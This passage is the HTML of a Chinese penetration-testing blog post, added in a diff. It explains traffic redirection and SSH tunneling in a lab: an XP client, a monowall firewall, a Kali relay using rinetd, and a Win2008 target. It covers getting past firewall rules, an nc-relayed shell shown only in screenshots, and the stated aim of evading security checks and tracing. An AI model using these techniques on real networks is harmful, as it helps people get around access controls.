@@ -1,0 +1,1090 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="该文章暂无概述">
+<meta property="og:type" content="article">
+<meta property="og:title" content="流量操控技术">
+<meta property="og:url" content="https://z9m8r8.github.io/2023/04/03/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF/index.html">
+<meta property="og:site_name" content="Ghost&#39;s Blog">
+<meta property="og:description" content="该文章暂无概述">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-04-03T09:52:32.000Z">
+<meta property="article:modified_time" content="2023-12-09T17:21:43.214Z">
+<meta property="article:author" content="Ghost">
+<meta property="article:tag" content="远程控制">
+<meta property="article:tag" content="后门">
+<meta property="article:tag" content="内网穿透">
+<meta property="article:tag" content="流量隧道">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://z9m8r8.github.io/2023/04/03/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2023/04/03/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF/","path":"2023/04/03/流量操控技术/","title":"流量操控技术"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>流量操控技术 | Ghost's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Ghost's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF"><span class="nav-text">一、流量操控技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91-redirection"><span class="nav-text">1、重定向 （Redirection）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9A%A7%E9%81%93-tunneling"><span class="nav-text">2、隧道 （Tunneling）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%81%E8%A3%85-encapsulation"><span class="nav-text">3、封装 （encapsulation）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E9%87%8D%E5%AE%9A%E5%90%91%E5%AE%9E%E6%93%8D"><span class="nav-text">二、重定向实操</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2"><span class="nav-text">1、环境部署</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#monowall-%E5%AE%89%E8%A3%85%E5%8F%8A%E9%85%8D%E7%BD%AE"><span class="nav-text">（1）monowall 安装及配置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xp%E5%8F%8Amonowall-%E8%A7%84%E5%88%99%E9%85%8D%E7%BD%AE"><span class="nav-text">（2）XP及monowall 规则配置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#kali-%E9%85%8D%E7%BD%AEnat"><span class="nav-text">（3）Kali 配置【NAT】</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#win2008-%E6%90%AD%E5%BB%BA%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83nat"><span class="nav-text">（4）win2008 搭建测试环境【NAT】</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xp%E6%B5%8B%E8%AF%95%E7%AA%81%E7%A0%B4%E4%B8%8A%E7%BD%91"><span class="nav-text">（5）XP测试【突破上网】</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%E8%87%B3win2008%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="nav-text">2、重定向至win2008的远程桌面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nc-%E9%87%8D%E5%AE%9A%E5%90%91%E8%8E%B7%E5%8F%96-shell"><span class="nav-text">3、NC 重定向获取 shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89ssh-%E9%9A%A7%E9%81%93"><span class="nav-text">三、SSH 隧道</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="nav-text">1、本地端口转发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="nav-text">2、远程端口转发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E9%9A%A7%E9%81%93%E6%A8%A1%E5%BC%8F"><span class="nav-text">3、动态隧道模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x%E5%8D%8F%E8%AE%AE%E8%BD%AC%E5%8F%91"><span class="nav-text">4、X协议转发</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9Bssh-%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%AE%9E%E6%93%8D"><span class="nav-text">四、SSH 本地端口转发实操</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2-1"><span class="nav-text">1、环境部署</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E8%BF%B0"><span class="nav-text">（1）基本概述</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#kali-2022-%E9%85%8D%E7%BD%AE"><span class="nav-text">（2）kali-2022 配置</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BF%E9%97%AE-win2008"><span class="nav-text">2、访问 win2008</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BF%E9%97%AEkali-2022%E7%9A%84web%E7%89%B9%E6%AE%8A"><span class="nav-text">3、访问kali-2022的web【特殊】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nc-%E8%8E%B7%E5%8F%96shell"><span class="nav-text">4、nc 获取shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="nav-text">5、远程桌面</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94ssh-%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="nav-text">五、SSH 远程端口转发</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xp%E5%AE%89%E8%A3%85iis"><span class="nav-text">1、xp安装iis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BF%E9%97%AE-xp-%E7%9A%84iis"><span class="nav-text">2、访问 xp 的iis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BF%E9%97%AE-xp-%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="nav-text">3、访问 xp 远程桌面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-nc-%E7%9A%84-shell"><span class="nav-text">4、获取 nc 的 shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%ADssh%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="nav-text">六、SSH动态端口转发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83x%E5%8D%8F%E8%AE%AE%E8%BD%AC%E5%8F%91"><span class="nav-text">七、X协议转发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%ABdns-%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93"><span class="nav-text">八、DNS 协议隧道</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dns-%E9%9A%A7%E9%81%93%E5%8E%9F%E7%90%86"><span class="nav-text">1、DNS 隧道原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dns2tcp-%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D"><span class="nav-text">2、dns2tcp 工具介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF%E4%B8%80"><span class="nav-text">3、实验环境【适用场景一】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8B%E9%9A%A7%E9%81%93"><span class="nav-text">4、建立隧道</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E9%9A%A7%E9%81%93%E5%B5%8C%E5%A5%97"><span class="nav-text">九、隧道嵌套</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81dns2tcp-%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF%E4%BA%8C"><span class="nav-text">十、dns2tcp 适用场景二</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91-dns-%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE"><span class="nav-text">1、内网 DNS 服务器配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#monowall-%E9%85%8D%E7%BD%AE"><span class="nav-text">2、monowall 配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kali-2022-%E9%85%8D%E7%BD%AE-1"><span class="nav-text">3、kali-2022 配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E7%BD%91-dns-%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE"><span class="nav-text">4、外网 DNS 服务器配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91-kali-2.0-%E9%85%8D%E7%BD%AE"><span class="nav-text">5、内网 kali-2.0 配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8B%E9%9A%A7%E9%81%93-1"><span class="nav-text">6、建立隧道</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95"><span class="nav-text">7、测试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B8%80dns-%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7-iodine-%E4%BB%8B%E7%BB%8D"><span class="nav-text">十一、DNS 协议隧道工具 iodine
+介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#linux-%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E5%AE%9E%E6%93%8D"><span class="nav-text">1、linux 环境下的实操</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows-%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%93%8D"><span class="nav-text">2、Windows 环境实操</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%BA%8C%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7-ncat-%E4%BB%8B%E7%BB%8D"><span class="nav-text">十二、隧道工具 NCAT 介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ncat-%E4%BB%A3%E7%90%86%E6%BC%94%E7%A4%BA"><span class="nav-text">1、NCAT 代理演示</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#broker-%E4%B8%AD%E4%BB%8B%E5%8A%9F%E8%83%BD%E6%BC%94%E7%A4%BA"><span class="nav-text">2、broker 中介功能演示</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ghost"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Ghost</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">92</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">45</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2023/04/03/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Ghost">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ghost's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="流量操控技术 | Ghost's Blog">
+      <meta itemprop="description" content="该文章暂无概述">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          流量操控技术
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-04-03 17:52:32" itemprop="dateCreated datePublished" datetime="2023-04-03T17:52:32+08:00">2023-04-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-12-10 01:21:43" itemprop="dateModified" datetime="2023-12-10T01:21:43+08:00">2023-12-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/kali-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">kali 渗透测试</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">安全工具</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>4.2k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>15 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">该文章暂无概述</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="一流量操控技术">一、流量操控技术</h2>
+<ul>
+<li>Traffic manipulation technique</li>
+<li>渗透测试中经常遇到访问受限的网络环境</li>
+<li>使用隐蔽的手段逃避安全检查措施和溯源追踪【加密+代理】</li>
+<li>证明看似严格的访问控制仍然存在弱点</li>
+<li>在非受信任的网络中实现安全的数据传输</li>
+<li>部分概念的实现过程略有烧脑</li>
+</ul>
+<h3 id="重定向-redirection">1、重定向 （Redirection）</h3>
+<ul>
+<li>IP、Port【明文传递，不安全】</li>
+</ul>
+<h3 id="隧道-tunneling">2、隧道 （Tunneling）</h3>
+<ul>
+<li>在不受信任的网络环境中实现安全的通信</li>
+<li>通常使用多种加密技术建立通信隧道</li>
+<li>点到点（IP2IP）、端到端（Port2Port，更安全）隧道</li>
+<li>VPN：pptp、l2tp、IPSec、SSL vpn</li>
+</ul>
+<h3 id="封装-encapsulation">3、封装 （encapsulation）</h3>
+<ul>
+<li>通常结合在隧道中使用，使用一种协议封装一种协议 （RPC over
+http、VoIP）</li>
+<li>使用网关设备实现不同类型的互联互通</li>
+</ul>
+<h2 id="二重定向实操">二、重定向实操</h2>
+<h3 id="环境部署">1、环境部署</h3>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a994a3a876.png" /></p>
+<ul>
+<li>XP：内网机</li>
+<li>monowall：防火墙</li>
+<li>kali：代理中转</li>
+<li>win2008：目标机</li>
+</ul>
+<h4 id="monowall-安装及配置">（1）monowall 安装及配置</h4>
+<ul>
+<li>iso：<a
+target="_blank" rel="noopener" href="http://sourceforge.net/projects/archiveos/files/m/monowall/generic-pc-1.8.1.iso/download">http://sourceforge.net/projects/archiveos/files/m/monowall/generic-pc-1.8.1.iso/download</a></li>
+<li>注意，新建虚拟机，选择FreeBSD和更早的版本。</li>
+<li><strong>配置</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a999f27590.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a99a9c6f2d.png" /></p>
+<h4 id="xp及monowall-规则配置">（2）XP及monowall 规则配置</h4>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a99b56320b.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202303/2379545-20230315225859516-553778834.png" /></p>
+<p>注，将VM的虚拟网络编辑器的DHCP服务关掉，否则XP地址是VM的DHCP分配的，我们要让monowall给XP分配IP地址</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a99bdd6a79.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202303/2379545-20230315230317120-468266088.gif" /></p>
+<p>注，规则生效前是可以正常访问外网的（如百度），生效后刷新百度就没反应了。</p>
+<h4 id="kali-配置nat">（3）Kali 配置【NAT】</h4>
+<ul>
+<li>IP：192.168.159.129</li>
+</ul>
+<p>apt-get install rinetd vim /etc/rinetd.conf</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a99df85e57.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202303/2379545-20230315231149875-1947128160.png" /></p>
+<ul>
+<li>配置完启动</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a99e709153.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202303/2379545-20230315231325772-1623373245.png" /></p>
+<h4 id="win2008-搭建测试环境nat">（4）win2008 搭建测试环境【NAT】</h4>
+<ul>
+<li>IP：192.168.159.134，phpstudy安装略……</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a99f60ca51.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202303/2379545-20230315231458602-2112159479.png" /></p>
+<h4 id="xp测试突破上网">（5）XP测试【突破上网】</h4>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a99ff3e9b1.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202303/2379545-20230315231801152-1556892010.png" /></p>
+<h3 id="重定向至win2008的远程桌面">2、重定向至win2008的远程桌面</h3>
+<ul>
+<li>Kali 改 rinetd 的配置，并重启。</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9a08cc561.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9a1337893.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202303/2379545-20230316100141750-875771632.gif" /></p>
+<h3 id="nc-重定向获取-shell">3、NC 重定向获取 shell</h3>
+<ul>
+<li>下载：<a
+target="_blank" rel="noopener" href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9a2e6d60f.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202303/2379545-20230316104019013-754903330.gif" /></p>
+<p><strong>注</strong>，nc中转连接不了的话，可以重启 kali 试试</p>
+<h2 id="三ssh-隧道">三、SSH 隧道</h2>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9a364534e.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202303/2379545-20230316112255571-554627747.png" /></p>
+<ul>
+<li><strong>SSH 支持双向通信隧道</strong></li>
+<li>将其他 TCP 端口的通信通过 SSH 链接来转发</li>
+<li>用 SSH 作为传输协议，对流量自动加解密</li>
+<li>突破防火墙访问规则的限制，可用于翻墙</li>
+<li><strong>SSH 本地端口转发</strong></li>
+<li>使效果类似于 rinetd，rinetd
+的监听端口在防火墙之外，ssh的监听在本地</li>
+<li>将一<strong>本地端口</strong>与远程服务器建立隧道</li>
+<li><strong>建立双向安全隧道</strong></li>
+<li>将其他 TCP 端口的通信通过 SSH 链接来转发</li>
+<li>用 SSH 作为传输协议，对流量自动加解密</li>
+<li>突破防火墙访问规则的限制，可用于翻墙</li>
+</ul>
+<h3 id="本地端口转发"><strong>1、本地端口转发</strong></h3>
+<ul>
+<li>本机侦听端口，访问转发到远程主机指定端口</li>
+<li>SSH 客户端+应用客户端位于 FW 一端</li>
+<li>SSH 服务器+应用服务器位于另一端</li>
+<li>端口转发基于家里起来的 SSH 隧道，隧道中断端口转发中断</li>
+<li>只能在建立隧道时创建转发，不能为已有隧道增加端口转发</li>
+</ul>
+<h3 id="远程端口转发"><strong>2、远程端口转发</strong></h3>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9a41db04d.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202303/2379545-20230317121808973-411774577.png" /></p>
+<ul>
